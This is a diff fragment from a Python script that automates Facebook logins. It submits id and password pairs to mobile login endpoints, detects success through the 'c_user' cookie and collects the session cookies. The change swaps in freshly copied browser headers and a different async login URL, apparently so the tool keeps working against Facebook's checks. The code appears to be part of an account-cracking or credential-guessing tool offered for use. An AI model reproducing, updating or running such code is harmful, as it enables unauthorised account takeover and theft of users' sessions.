@@ -1217,24 +1217,8 @@ def m6(idf,pwv):
              'next': 'https://m.facebook.com/login/save-device/',
              'flow': 'login_no_pin',
              'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps),}
-   header_freefb = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-   lo = session.post('https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-password%2F%3Fshbl%3D0%26ref%3Ddbl&refsrc=deprecated&ref=dbl',data=log_data,headers=header_freefb).text
+   header_freefb = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1', 'origin': 'https://m.facebook.com', 'referer': 'https://m.facebook.com/login.php', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', 'sec-ch-ua-full-version-list': '"Google Chrome";v="123.0.6312.86", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.86"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"10.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': ua, 'viewport-width': '484', 'x-asbd-id': '129477', 'x-fb-lsd': 'AVr7NV_lql0', 'x-requested-with': 'XMLHttpRequest', 'x-response-format': 'JSONStream'}
+   lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
